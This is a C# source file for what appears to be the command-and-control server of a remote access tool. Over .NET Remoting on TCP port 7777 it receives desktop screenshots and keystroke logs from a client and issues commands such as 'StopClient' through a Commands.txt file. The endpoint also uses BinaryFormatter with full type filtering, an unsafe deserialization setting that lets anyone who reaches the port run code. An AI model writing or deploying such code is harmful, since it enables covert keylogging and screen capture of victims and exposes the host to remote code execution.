﻿using RemotingInterface;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CommandServer
{
    internal class RemoteDesktop
    {
        public static TextBox tb3 = null;
        public static PictureBox picbox = null;
        public static ToolStripStatusLabel tsl = null;
        /*public static Button btn5 = null;
        public static Button btn6 = null;
        public static Button btn7 = null;
        public static Button btn8 = null;*/

        public static void initRemoteDesktop(TextBox tb3In, PictureBox picboxIn, ToolStripStatusLabel tslIn)
        {
            tb3 = tb3In;
            picbox = picboxIn;
            tsl = tslIn;

            BinaryServerFormatterSinkProvider provider = new BinaryServerFormatterSinkProvider();
            provider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;
            System.Collections.Hashtable props = new System.Collections.Hashtable();
            props.Add("port", 7777);

            TcpChannel chan = new TcpChannel(props, null, provider);
            ChannelServices.RegisterChannel(chan, false);
            RemotingConfiguration.RegisterWellKnownServiceType(
                typeof(DesktopServer), "DesktopCapture", WellKnownObjectMode.SingleCall);
        }

        public class DesktopServer : MarshalByRefObject, DesktopInterface
        {
            public void HelloMethod(String name)
            {
                using (StreamWriter sw = File.CreateText("Hello.txt"))
                {
                    sw.WriteLine(String.Format("Hello, {0}", name));
                }
            }

            public void GoodbyeMethod()
            {
                using (StreamWriter sw = File.CreateText("Bye.txt"))
                {
                    sw.WriteLine("Goodbye");
                }
            }

            public void SendBitmap(MemoryStream memoryStream)
            {
                Bitmap bmp = new Bitmap(memoryStream);
                bmp.Save("Desktop.jpg", ImageFormat.Jpeg);
            }

            public string GetCommands()
            {
                string commands;
                bool bFileExists = File.Exists("Commands.txt");
                if (bFileExists)
                {
                    using (StreamReader sr = File.OpenText("Commands.txt"))
                    {
                        commands = sr.ReadLine();
                    }
                    return commands;
                }
                else return "Continue";
            }

            public void SendKeystrokes(String keylog)
            {
                using (StreamWriter sw = File.CreateText("Keystrokes.txt"))
                {
                    sw.WriteLine(keylog);
                }
            }

        }

        public static void btn5_Click()
        {
            bool bFileExists = File.Exists("Hello.txt");
            if (bFileExists)
            {
                using (StreamReader sr = File.OpenText("Hello.txt"))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        tb3.Text = s;
                    }
                }
            }
        }

        public static void btn6_Click()
        {
            bool bFileExists = File.Exists("Bye.txt");
            if (bFileExists)
            {
                using (StreamReader sr = File.OpenText("Bye.txt"))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        tb3.Text = s;
                    }
                }
            }
        }

        public static void btn7_Click()
        {
            bool bFileExists = File.Exists("Desktop.jpg");
            if (bFileExists)
            {
                picbox.ImageLocation = "Desktop.jpg";
            }
        }

        public static void btn8_Click()
        {
            using (StreamWriter sw = File.CreateText("Commands.txt"))
            {
                sw.WriteLine("StopClient");
            }
        }

    }
}
